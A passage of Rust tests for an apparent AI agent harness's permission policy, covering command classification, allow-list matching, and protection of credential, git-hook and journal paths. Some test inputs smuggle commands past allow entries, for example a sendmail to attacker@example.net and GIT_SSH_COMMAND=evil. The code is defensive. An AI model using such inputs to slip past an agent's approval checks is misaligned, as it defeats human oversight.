            ("sudo", "-E"),
            ("nice", "-n"),
            ("timeout -k 1", "-v"),
            ("xargs", "-0"),
            ("sudo env", "-i"),
            ("timeout 5 env", "-u A"),
        ] {
            hidden.push(padded(wrapper, pad, 40));
        }
        for cmd in &hidden {
            assert_eq!(p.classify_sh(cmd), Class::Irreversible, "{cmd}");
        }
        // Inside the bound, the same wrappers still see the force push itself.
        for wrapper in ["env -u A", "env A=1", "sudo -E", "timeout 5 env -u A"] {
            assert_eq!(
                p.classify_sh(&padded(wrapper, "", 0)),
                Class::Irreversible,
                "{wrapper}"
            );
        }
        let long_args = format!(
            "timeout 60 pytest -q {}",
            vec!["tests/test_x.py"; 60].join(" ")
        );
        let long_find = format!("find . {} -print", vec!["-name '*.rs' -o"; 30].join(" "));
        // `find` names its program after `-exec`, however long the expression before it.
        let long_exec = format!(
            "find . -type f \\( {} -name '*.md' \\) -not -path './target/*' -exec grep -l TODO {{}} +",
            ["-name '*.rs' -o"; 12].join(" ")
        );
        let everyday = [
            "cargo test",
            "cargo build --release",
            "git status",
            "git diff",
            "git add -A && git commit -m \"x\"",
            "for f in *.rs; do wc -l \"$f\"; done",
            "timeout 60 pytest -q",
            "find . -name '*.py' -exec grep -l foo {} +",
            "env RUST_BACKTRACE=1 cargo test",
            "FOO=bar make",
            "cat \"$HOME/.bashrc\"",
            "echo \"$PATH\"",
            "ls $(pwd)",
            "python3 -c 'print(1)'",
            "sed -n 1,5p file",
            "xargs -n1 echo < list",
            "nice -n 10 make -j4",
            "command -v ssh",
            "command -V aws",
            "command -v aws || echo none",
            "env RUST_BACKTRACE=1 cargo test \"$name\"",
            "timeout 60 cat \"$f\"",
            "git log --oneline -n 3 -- src/push.rs",
            "git -C \"$dir\" status",
            "FOO=$(date) make",
            "echo `date`",
            long_args.as_str(),
            long_find.as_str(),
            long_exec.as_str(),
            "time -p cargo test",
            "env -S 'cargo test'",
        ];
        for cmd in everyday {
            assert!(p.classify_sh(cmd) <= Class::LocalWrite, "{cmd}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn a_shell_allow_entry_covers_commands_that_start_with_its_words() {
        let (p, dir, _dirs) = test_policy(
            "words-allow",
            false,
            &["sendmail owner@example.com", "git push origin"],
        );
        assert_eq!(
            p.approve("sendmail owner@example.com < report", Class::External)
                .await
                .ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        assert_eq!(
            p.approve("{ git push origin main; }", Class::External)
                .await
                .ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        for cmd in [
            "sendmail attacker@example.net --note \"sendmail owner@example.com\"",
            "echo; sendmail x 'git push origin'",
            "GIT_SSH_COMMAND=evil git push origin main",
            "sudo git push origin main",
        ] {
            assert!(p.approve(cmd, p.classify_sh(cmd)).await.is_err(), "{cmd}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn named_calls_are_approved_on_their_identity_never_on_their_arguments() {
        let (p, dir, _dirs) = test_policy(
            "calls",
            false,
            &["mcp demo.add", "mcp notes.*", "http probe.get"],
        );
        let call = |server, tool| Call::Mcp { server, tool };
        let approve = |c, args: serde_json::Value| {
            let p = &p;
            async move { p.approve_call(c, &args, Class::External).await }
        };
        assert_eq!(
            approve(call("demo", "add"), json!({"a": 1})).await.ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        assert!(
            approve(call("demo", "delete_note"), json!({"name": "mcp demo.add"}))
                .await
                .is_err()
        );
        assert!(approve(call("demo", "add2"), json!({})).await.is_err());
        assert!(approve(call("demo.add", "x"), json!({})).await.is_err());
        assert_eq!(
            approve(call("notes", "delete"), json!({})).await.ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        assert!(approve(call("notesx", "delete"), json!({})).await.is_err());
        assert_eq!(
            approve(
                Call::Http {
                    namespace: "probe",
                    endpoint: "get"
                },
                json!({"q": "x"})
            )
            .await
            .ok(),
            Some(ApprovalSource::PolicyAllow)
        );
        assert!(
            approve(
                Call::Http {
                    namespace: "probe",
                    endpoint: "post"
                },
                json!({"q": "http probe.get"})
            )
            .await
            .is_err()
        );
        assert_eq!(
            p.approve_call(call("demo", "delete_note"), &json!({}), Class::Read)
                .await
                .ok(),
            Some(ApprovalSource::NotRequired)
        );
        // A shell allow entry for the same text approves no call, and a call entry approves no shell command.
        assert!(
            p.approve("mcp demo.delete_note", Class::External)
                .await
                .is_err()
        );
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn approval_sources_round_trip_through_their_journaled_names() {
        for source in ApprovalSource::ALL {
            assert_eq!(ApprovalSource::parse(source.name()), Some(source));
        }
        assert_eq!(ApprovalSource::parse("owner"), None);
    }

    #[test]
    fn prompts_show_control_characters_escaped() {
        assert_eq!(
            shown("ls\rgit push --force\u{1b}[2K"),
            "ls\\rgit push --force\\u{1b}[2K"
        );
        assert_eq!(shown("a\u{202e}b \"q\" 'q'\n"), "a\\u{202e}b \"q\" 'q'\\n");
        let call = Call::Mcp {
            server: "s",
            tool: "t\u{1b}[1A",
        };
        assert_eq!(call.to_string(), "mcp s.t\\u{1b}[1A");
    }

    #[test]
    fn hx_own_directories_are_never_a_root_and_file_tools_refuse_them() {
        let dirs = TestDirs::new();
        let base = dirs
            .config()
            .parent()
            .unwrap()
            .parent()
            .unwrap()
            .to_path_buf();
        // A workspace that holds hx's directories, or lies inside one, is refused.
        for ws in [base.clone(), dirs.state().join("ws")] {
            std::fs::create_dir_all(&ws).unwrap();
            let err = Policy::new(&dirs, &ws, false, None, None, None)
                .err()
                .expect("refused")
                .to_string();
            assert!(err.contains("overlaps hx's"), "{err}");
        }
        // So is an [fs] root that does (`write = ["~"]` with hx's directories under the home directory).
        let ws = base.join("project");
        std::fs::create_dir_all(ws.join(".harness")).unwrap();
        for root in [
            base.to_string_lossy().into_owned(),
            dirs.config().to_string_lossy().into_owned(),
        ] {
            std::fs::create_dir_all(dirs.config()).unwrap();
            std::fs::write(
                ws.join(".harness/policy.toml"),
                format!("[fs]\nwrite = [{root:?}]\n"),
            )
            .unwrap();
            crate::trust::record(&ws, &dirs).unwrap();
            let err = Policy::new(&dirs, &ws, false, None, None, None)
                .err()
                .expect("refused")
                .to_string();
            assert!(
                err.contains("overlaps hx's configuration directory"),
                "{err}"
            );
        }
        std::fs::remove_file(ws.join(".harness/policy.toml")).unwrap();
        let p = Policy::new(&dirs, &ws, true, Some(ApprovalMode::Deny), None, None).unwrap();
        let rules = p.confinement();
        assert!(
            rules
                .read
                .iter()
                .chain(&rules.write)
                .all(|r| dirs.overlap(r).is_none() || r.starts_with(p.registry())),
            "{rules:?}"
        );
        // File tools refuse the trust store, the secrets, the journal and its directory, whatever the spelling.
        let own = dirs.workspace(&ws);
        std::fs::create_dir_all(&own.ar).unwrap();
        let journal = p.log.path.to_string_lossy().into_owned();
        for path in [
            dirs.trust_store(),
            own.secrets.clone(),
            own.log.clone(),
            own.ar.clone(),
            p.log.path.clone(),
            own.log.join("x/../y"),
        ] {
            let path = path.to_string_lossy().into_owned();
            assert!(
                p.check_read(&path)
                    .unwrap_err()
                    .to_string()
                    .contains("hx's own"),
                "read {path}"
            );
            assert!(
                p.check_write(&path)
                    .unwrap_err()
                    .to_string()
                    .contains("protected"),
                "write {path}"
            );
        }
        std::os::unix::fs::symlink(&own.log, ws.join("logs")).unwrap();
        assert!(p.check_read("logs").is_err() && p.check_write("logs/x").is_err());
        assert!(
            futures::executor::block_on(p.authorize_path(&journal, false)).is_err(),
            "autopilot cannot grant a journal"
        );
        // This run's materialized skills are the exception: readable, never writable.
        std::fs::create_dir_all(p.registry().join("skill")).unwrap();
        std::fs::write(p.registry().join("skill/notes.md"), "notes").unwrap();
        let skill = p
            .registry()
            .join("skill/notes.md")
            .to_string_lossy()
            .into_owned();
        assert!(p.check_read(&skill).is_ok());
        assert!(p.check_write(&skill).is_err());
        drop(p);
        let _ = std::fs::remove_dir_all(&ws);
    }

    #[test]
    fn a_run_resumes_only_from_its_workspace_log_directory() {
        let dirs = TestDirs::new();
        let ws =
            std::env::temp_dir().join(format!("hx-policy-resume-elsewhere-{}", std::process::id()));
        std::fs::create_dir_all(&ws).unwrap();
        let p = Policy::new(&dirs, &ws, false, None, None, None).unwrap();
        let (journal, copy) = (p.log.path.clone(), ws.join(p.log.path.file_name().unwrap()));
        drop(p);
        std::fs::copy(&journal, &copy).unwrap();
        let err = Policy::new(&dirs, &ws, false, None, Some(&copy), None)
            .err()
            .expect("refused")
            .to_string();
        assert!(
            err.contains("not in this workspace's log directory"),
            "{err}"
        );
        let _ = std::fs::remove_dir_all(&ws);
    }

    #[test]
    fn the_policy_comes_from_the_trusted_bytes() {
        let dirs = TestDirs::new();
        let ws =
            std::env::temp_dir().join(format!("hx-policy-trusted-bytes-{}", std::process::id()));
        std::fs::create_dir_all(ws.join(".harness")).unwrap();
        std::fs::write(
            ws.join(".harness/policy.toml"),
            "[budget]\nmax_tokens = 7\n",
        )
        .unwrap();
        crate::trust::record(&ws, &dirs).unwrap();
        assert_eq!(
            Policy::new(&dirs, &ws, false, None, None, None)
                .unwrap()
                .budget
                .max_tokens,
            Some(7)
        );
        // Changed after trust: not used at all (neither the new bytes nor, of course, the old ones).
        std::fs::write(
            ws.join(".harness/policy.toml"),
            "[budget]\nmax_tokens = 9\n",
        )
        .unwrap();
        assert_eq!(
            Policy::new(&dirs, &ws, false, None, None, None)
                .unwrap()
                .budget
                .max_tokens,
            None
        );
        let _ = std::fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn autopilot_grants_a_file_but_never_a_directory() {
        let (p, dir, _dirs) = test_policy("autopilot-dir", true, &[]);
        let outside = std::fs::canonicalize(std::env::temp_dir())
            .unwrap()
            .join(format!(
                "hx-policy-autopilot-dir-out-{}",
                std::process::id()
            ));
        std::fs::create_dir_all(outside.join(".ssh")).unwrap();
        std::fs::write(outside.join(".ssh/id_rsa"), "KEY").unwrap();
        std::fs::write(outside.join(".ssh/known_hosts"), "hosts").unwrap();
        let err = p
            .authorize_path(&outside.join(".ssh").to_string_lossy(), false)
            .await
            .unwrap_err();
        assert!(
            err.is::<OutsideRoots>() || err.is::<ApprovalRequired>(),
            "{err}"
        );
        assert!(
            !p.confinement().read.iter().any(|r| r.starts_with(&outside)),
            "a directory was granted without the owner"
        );
        p.authorize_path(&outside.join(".ssh/known_hosts").to_string_lossy(), false)
            .await
            .unwrap();
        assert!(
            p.authorize_path(&outside.join(".ssh/id_rsa").to_string_lossy(), false)
                .await
                .is_err(),
            "a credential file is never granted"
        );
        drop(p);
        let _ = std::fs::remove_dir_all(&outside);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn a_write_grant_never_names_a_directory_and_autopilot_asks_before_hidden_paths() {
        let (p, dir, _dirs) = test_policy("grant-dir-write", true, &[]);
        let outside = std::fs::canonicalize(std::env::temp_dir())
            .unwrap()
            .join(format!(
                "hx-policy-grant-dir-write-out-{}",
                std::process::id()
            ));
        std::fs::create_dir_all(outside.join("sub")).unwrap();
        std::fs::create_dir_all(outside.join(".config")).unwrap();
        for target in [Path::new("/"), outside.as_path(), &outside.join("sub")] {
            let err = p
                .authorize_path(&target.to_string_lossy(), true)
                .await
                .unwrap_err();
            assert!(err.to_string().contains("is not a file"), "{err}");
        }
        assert!(p.grants.lock().unwrap().is_empty(), "nothing was granted");
        // A grant journaled by an older run may still name a directory: it is never turned into a tree rule.
        p.grants.lock().unwrap().push(PathGrant {
            path: outside.clone(),
            recursive: false,
            write: true,
        });
        let rules = p.confinement();
        assert!(!rules.write.contains(&outside) && !rules.read.contains(&outside));
        p.grants.lock().unwrap().clear();
        // Autopilot writes an ordinary file outside the roots, and asks (here: is refused) for a hidden one.
        p.authorize_path(&outside.join("notes.txt").to_string_lossy(), true)
            .await
            .unwrap();
        for hidden in [
            ".bashrc",
            ".config/unit.service",
            "sub/.git/hooks/pre-commit",
        ] {
            let err = p
                .authorize_path(&outside.join(hidden).to_string_lossy(), true)
                .await
                .unwrap_err();
            assert!(
                err.is::<OutsideRoots>() || err.is::<ApprovalRequired>(),
                "{hidden}: {err}"
            );
        }
        // Reading a hidden file that is no credential is still an ordinary request.
        std::fs::write(outside.join(".bashrc"), "x").unwrap();
        p.authorize_path(&outside.join(".bashrc").to_string_lossy(), false)
            .await
            .unwrap();
        drop(p);
        let _ = std::fs::remove_dir_all(&outside);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn an_automatic_write_grant_covers_the_file_not_its_parent_tree() {
        let (p, dir, _dirs) = test_policy("grant-file", true, &[]);
        let outside =
            std::env::temp_dir().join(format!("hx-policy-grant-outside-{}", std::process::id()));
        std::fs::create_dir_all(outside.join("sub")).unwrap();
        let outside = std::fs::canonicalize(outside).unwrap();
        let note = outside.join("notes.txt");
        p.authorize_path(&note.to_string_lossy(), true)
            .await
            .unwrap();
        assert!(p.check_write(&note.to_string_lossy()).is_ok());
        assert!(
            p.check_write(&outside.join("other.txt").to_string_lossy())
                .is_err()
        );
        let rules = p.confinement();
        assert!(
            rules.write.contains(&note)
                && !rules
                    .write
                    .iter()
                    .any(|w| outside.starts_with(w) && *w != note)
        );
        // Never a directory holding the home directory or owner state, whoever is asked.
        for broad in [
            "/".to_string(),
            std::env::var("HOME").unwrap(),
            dir.parent().unwrap().to_string_lossy().into_owned(),
        ] {
            let err = p
                .authorize_path(&broad, false)
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("cannot be granted"), "{broad}: {err}");
        }
        drop(p);
        let _ = std::fs::remove_dir_all(&outside);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn git_hooks_and_config_are_protected_from_file_tools() {
        let (p, dir, _dirs) = test_policy("git-protect", false, &[]);
        for f in [".git/config", ".git/hooks/pre-commit", ".git/hooks"] {
            assert!(
                p.check_write(f)
                    .unwrap_err()
                    .to_string()
                    .contains("protected"),
                "{f}"
            );
        }
        assert!(p.check_write(".git/info/exclude").is_ok());
        drop(p);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn fs_roots_resolve_against_the_workspace_and_fail_loudly() {
        let dir = std::env::temp_dir().join(format!("hx-policy-fsroot-{}", std::process::id()));
        std::fs::create_dir_all(dir.join("data")).unwrap();
        let dir = std::fs::canonicalize(dir).unwrap();
        assert_eq!(fs_root(&dir, "data").unwrap(), dir.join("data"));
        assert_eq!(fs_root(&dir, "./data/../data").unwrap(), dir.join("data"));
        assert_eq!(
            fs_root(&dir, "~").unwrap(),
            std::fs::canonicalize(std::env::var("HOME").unwrap()).unwrap()
        );
        let err = fs_root(&dir, "missing").unwrap_err().to_string();
        assert!(
            err.contains("\"missing\"") && err.contains("does not resolve"),
            "{err}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }
}
